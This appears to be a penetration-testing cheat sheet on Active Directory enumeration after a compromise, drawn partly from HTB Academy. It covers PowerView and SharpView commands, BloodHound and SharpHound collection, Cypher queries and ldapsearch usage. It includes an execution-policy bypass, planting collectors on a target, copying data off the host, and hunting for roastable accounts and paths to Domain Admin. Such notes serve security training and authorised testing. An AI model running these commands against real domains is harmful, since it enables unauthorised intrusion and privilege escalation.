# Post-Compromise Enumeration

- We compromised a user what can we do with it
- How can we get Domain Admin

## Powerview or SharpView (.NET equivalent)

- Get it from [here](https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1) and put it in the compromised machine
- From a cmd in the target: `powershell -ep bypass` 
- Launch Powerview: `. .\powerview.ps1`
- Get info on the Domain Controller: `Get-NetDomain`
- Check policies: `Get-DomainPolicy`
- Policies in System Access: `(Get-DomainPolicy)."systemAccess"` (e.g.: we get info about password policy and minimum length so min size if we want to password spray)
- Info about the users `Get-NetUser`
- Get only usenames `Get-NetUser | select cn` (e.g.: will output Jessica Jones)
- Get only sam account name: `Get-NetUser | select samaccountname` (e.g.: will output jjones)
- Get only description: `Get-NetUser | select description` (e.g.: will output a description if provided by sysadmn or a default one)
- See all the properties a user have: `Get-UserProperty`
- Get more details for example password last set: `Get-UserProperty -Properties pwdlastset`
- Get more details for example logoncount: `Get-UserProperty -Properties logoncount`
- See if users have entered bad passwd: `Get-UserProperty -Properties badpwdcount`
- List all the computers in the Domain: `Get-NetComputer`
- Same but with much more info: `Get-NetComputer -FullData`
- Filter this load of data with specific info: `Get-NetComputer -FullData | select OperatingSystem`
- Get info on groups: `Get-NetGroup`
- Filter for a specific GroupName: `Get-NetGroup -GroupName "Domain Admins" `
- Filter on GroupName with a wildcard: `Get-NetGroup -GroupName *admin* `
- Get users from a specific group: `Get-NetGroup -GroupName "Domain Admins" `
- Get smb shared in the network: `Invoke-ShareFinder`
- Get group policies: `Get-NetGPO`
- Filter the info: `Get-NetGroup -GroupName "Domain Admins" `
- `.\SharpView.exe ConvertTo-SID -Name first.last` Find SID of a user
- `.\SharpView.exe Convert-ADName -ObjectName SID` find user with SID
- `Get-DomainPolicy` View the domain password policy (will show passwordhistorysize)
- `Get-DomainUser first.last  \| ConvertFrom-UACValue -showall` List all UAC values
- `.\SharpView.exe Get-Domain` View information about the current domain
- `.\SharpView.exe Get-DomainOU` List all OUs
- `.\SharpView.exe Get-DomainUser -KerberosPreauthNotRequired` Find ASREPRoastable users
- `Get-DomainComputer ` Get a listing of domain computers
- `.\SharpView.exe Get-DomainGPO  \| findstr displayname` List all GPO names
- ` Get-DomainGPO -ComputerIdentity HOSTNAME` List GPOs on a specific host
- `Test-AdminAccess -ComputerName HOSTNAME` Test local admin access on a remote host 
- `.\SharpView.exe Get-NetShare -ComputerName HOSTNAME` Enumerate open shares on a remote computer 
- `Find-DomainUserLocation` Find machines where domain users are logged in 
- `Get-DomainTrust` View a list of domain trusts 
- `(Get-DomainUser).count` Count all domain users 
- `.\SharpView.exe Get-DomainUser -Help` Get help about a SharpView function 
- `Get-DomainUser -Properties samaccountname,description \| Where {$_.description -ne $null}` Find non-blank user description fields
- `.\SharpView.exe Get-DomainUser -SPN` Find users with SPNs set
- `Find-ForeignGroup` Find foreign domain users
- `Get-DomainGroup -Properties Name` List domain groups
- `.\SharpView.exe Get-DomainGroupMember -Identity 'Help Desk'` Get members of a domain group
- `.\SharpView.exe Get-DomainGroup -AdminCount` List protected groups
- `.\SharpView.exe Find-ManagedSecurityGroups` List managed security groups
- `Get-NetLocalGroup -ComputerName HOST` Get local groups on a host
- `.\SharpView.exe Get-NetLocalGroupMember -ComputerName HOSTNAME` Get members of a local group
- `.\SharpView.exe Get-DomainComputer -Unconstrained` Find computers that allow unconstrained delegation
- `Get-DomainComputer -TrustedToAuth` Find computers set with constrained delegation
- `Get-DomainObjectAcl -Identity first.last` Enumerate ACLs on a user
- `Find-InterestingDomainAcl` Find objects in the domain with modification rights over non built-in objects
- `Get-PathAcl "\\HOSTNAME\Directory"` Find the ACLs set on a directory 
- ` gpresult /r /S HOSTNAME` Get a report of all GPOs applied to a host
- ` Get-DomainGPO  \| Get-ObjectAcl` Find GPO permissions
- `Get-DomainTrustMapping` Enumerate trusts for our domain/reachable domains
- `Get-NetShare -ComputerName COMPUTER` List share on computer
- `Get-DomainGPO` list all gpo and related info
- `Get-DomainGPO | select displayname` list all gpo names
- `Get-DomainGPO | select displayname,objectguid` list gpo names with their guid
- `Get-DomainTrustMapping` enumerate all trusts for our current domain and other reachable domains

*Note: If you do not get result with powerview, you can try this in powershell `Import-Module .\PowerView.ps1`*


### Powerview - Resources

- [PowerView Cheat Sheet](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)

## BloodHound

### Setup and Install

- Install: `sudo apt install bloodhound`
- Launch neo4j for Setup: `neo4j console`
- Open the link provided by neo4j, connect with default creds: `neo4j:neo4j` 
- Change the password
- From the console launch `bloodhound`
- Connect with the creds you just set up in neo4j

### Grabbing Data to feed Bloodhound

- Download and setup an injector for instance invoke-bloodhound for powershell, we can use [sharphound](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1)
- Put Sharphound in your target machine
- From the cmd of your target run: `powershell -ep bypass`
- Run Sharphound: `. .\SharpHound.ps1`
- Now we can invoke-bloodhound to collect data: `Invoke-BloodHound -CollectionMethod All -Domain DOMAIN.local -ZipFilename data.zip`
- Copy the zip file in your attacking machine
- Click on upload data and double click on the zip file
- In Analysis we can now click to Find all Domains
- We can also find the shortest path to the domain admins
- We want to find boxes where a domain admin is logged in.
- `xfreerdp /v:IP /u:user /drive:data,/tmp` Transfer data to and from the target host with drive redirection

### Bloodhound Python

- *Note: slower than the PowerShell and C# ingestors*
- Requirements: impacket toolkit, ldap3, and dnspython
- `pip install bloodhound`
- From a linux box not in the domain
  - Edit /etc/resolv.conf
    ```
    # Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
    #     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
    # 127.0.0.53 is the systemd-resolved stub resolver.
    # run "systemd-resolve --status" to see details about the actual nameservers.

    
    domain domain.local
    domain localdomain
    search localdomain
    nameserver IP-ADR
    ```
- `bloodhound-python -dc domain-controller.domain.local -gc domain-controller.domain.local -d domain.local -c All -u first.last -p password`

### Analyzing data

- Check out Domain Users group and see the rights it has
- Click on the pathfinding button and enter the domain to see if we have any direct paths to Domain Admin for all users
- Run some of the Pre-Built Analytics Queries to find additional interesting information
  - Obtain a list of all Domain Admins
  - Look at the `Find Shortest Paths to Domain Admins` query
  - `Find Principals with DCSync Rights` Find accounts that can perform the DCSync attack, which will be covered in a later module.
  - `Users with Foreign Domain Group Membership` Find users that belong to groups in other domains. This can help mount cross-trust attacks.
  - `Groups with Foreign Domain Group Membership` Find groups that are part of groups in other domains. This can help mount cross-trust attacks.
  - `Map Domain Trusts`	Find all trust relationships with the current domain.
  - `Shortest Paths to Unconstrained Delegation Systems` Find the shortest path to hosts with Unconstrained Delegation.
  - `Shortest Paths from Kerberoastable Users` Show the shortest path to Domain Admins by selecting from all users in a dropdown that can be subjected to a Kerberoasting attack.
  - `Shortest Path from Owned Principals` If we right-click a node and select `Mark user as owned` or `Mark computer as owned`, we can then run this query to see how far we can go from any users/computers that we have marked as "owned". This can be very useful for mounting further attacks.
  - `Shortest Paths to Domain Admins from Owned Principals` Find the shortest path to Domain Admin access from any user or computer marked as "owned".
  - `Shortest Paths to High-Value Targets` This will give us the shortest path to any objects that BloodHound already considers a high-value target. It can also be used to find paths to any objects that we right-click on and select Mark X as High Value.
- Look at GPOs as well. In the Enumerating Group Policy Objects (GPOs) section
- In BloodHound, we can right-click on any edge and click on ? Help in the pop-up menu and receive help on the specific edge with various tabs
  - Info	General overview of the edge and what type of access it grants.
  - Abuse Info	Specific tools/commands/techniques that can be used to abuse the privilege.
  - Opsec Considerations	Opsec Considerations are also documented on the BloodHound wiki. This provides info on how "noisy" a particular command can be and what type of event log ID it will generate.
  - References	Additional reading on tactics/tools/techniques that can be used to abuse the privilege.
([Source: ACTIVE DIRECTORY BLOODHOUND on HTB Academy](https://academy.hackthebox.com/course/preview/active-directory-bloodhound))

### Icons in Bloodhound

- This icon is used to represent a user: ![User Icon](../.res/user-icon.png)
  
- This icon is used to represent a group: ![Group Icon](../.res/Group-Icon.png)
  
- This icon is used to represent a GPO: ![GPO Icon](../.res/GPO-icon.png) we can click on it and check the Node Info

### Cypher Query Language for custom queries

([Source: ACTIVE DIRECTORY BLOODHOUND on HTB Academy](https://academy.hackthebox.com/course/preview/active-directory-bloodhound))

#### Structure of query

- `MATCH (A)-[B]->(C) RETURN A,B,C` Here A and C are nodes B is the relationship between A and C
- `MATCH (n:User),(m:Group) MATCH p=(n)-[r:MemberOf*1..3]->(m) RETURN p`

#### Most commin Keywords

- `MATCH` Used before describing the search pattern for finding one or more nodes or relationships.
- `WHERE` Used to add more constraints to specific patterns or filter out unwanted patterns.
- `RETURN` Used to specify the results format and organizes the resulting data. Results can be returned with specific properties, lists, ordering, etc.
- `CREATE` and `DELETE` - Used to create and delete nodes/relationships
- `SET` and `REMOVE` - Used to set values to properties and add labels to nodes
- `MERGE` - Used to create nodes uniquely without any duplicates.

#### Example of query

- `MATCH p=(n:User)-[r:MemberOf*1..]->(m:Group {highvalue:true}) RETURN p` Find the members of all groups deemed to be "high-value targets."
- `MATCH (u:User) WHERE ANY (x IN u.serviceprincipalnames WHERE toUpper(x) CONTAINS 'SQL')RETURN u` Find users with a keyword in their Service Principal Name (SPN)
- `MATCH (u:User {dontreqpreauth: true}) RETURN u` Find users who do not require Kerberos pre-authentication 
- `MATCH (u:User) WHERE u.description IS NOT NULL RETURN u.name,u.description` Find all users with a description field that is not blank

#### Edge relationships in Bloodhound

- MemberOf	One node (user, group, or computer) is a member of a second node (group)
- AdminTo	One node (user, group, or computer) has local admin rights on a second node (computer)
- HasSession	One node (user) has a session on a second node (computer)
- TrustedBy	One node (domain) is trusted by a second node (domain)

### Bloodhound - Resources

- [Cypher Query Language](https://neo4j.com/developer/cypher/)
- [Edges in Bloodhound](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html)
- [SharpHound: Target Selection and API Usage - CptJesus](https://blog.cptjesus.com/posts/sharphoundtargeting)

## ldapsearch - cmd line

- `ldapsearch -x -h IP-ADRESS -b "dc=DOMAIN-NAME,dc=LOCAL"` will send back a lot of useful info including user enum. Very efficient when you can leverage anonymous bind

## ldapsearch-ad.py - Example of commands

- `python3 ldapsearch-ad.py -l TARGET-IP -u firstname.lastname -p 'password' -d DOMAIN.LOCAL -t all` You will have very detailed infos on the domain and you can event output it in a file with `-o filename`
- `python3 ldapsearch-ad.py -l TARGET-IP -u firstname.lastname -p 'password' -d DOMAIN.LOCAL -t search -s '(&(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=262144))'` fin users with smartcard required for interactive logon 
- `python3 ldapsearch-ad.py -l TARGET-IP -u firstname.lastname -p 'password' -d DOMAIN.LOCAL -t pass-pols` You will get the password policy
- `python3 ldapsearch-ad.py -l 10.129.42.188 -u firstname.lastname -p 'password' -d DOMAIN.LOCAL -t search -s '(&(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=128))'` user account has their userAccountControl value set to ENCRYPTED_TEXT_PWD_ALLOWED

## Tools

- [ldapsearch-ad.py - yaap7](https://github.com/yaap7/ldapsearch-ad)

## Resources

- [List of AD property flags for ldap queries](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties#list-of-property-flags)
- [Custom queries in Bloodhound - awsmhacks](https://github.com/awsmhacks/awsmBloodhoundCustomQueries)
- [Custom queries in Bloodhound - Compass Security](https://github.com/CompassSecurity/BloodHoundQueries/blob/master/customqueries.json)
- [Custom queries in Bloodhound - Hausec](https://github.com/hausec/Bloodhound-Custom-Queries)
- [ACTIVE DIRECTORY BLOODHOUND on HTB Academy](https://academy.hackthebox.com/course/preview/active-directory-bloodhound)
- [sans institute cheat sheet with custom db queries](https://sansorg.egnyte.com/dl/zscX9KYH5M)
- [The dog whisperer handbook](https://ernw.de/download/BloodHoundWorkshop/ERNW_DogWhispererHandbook.pdf)
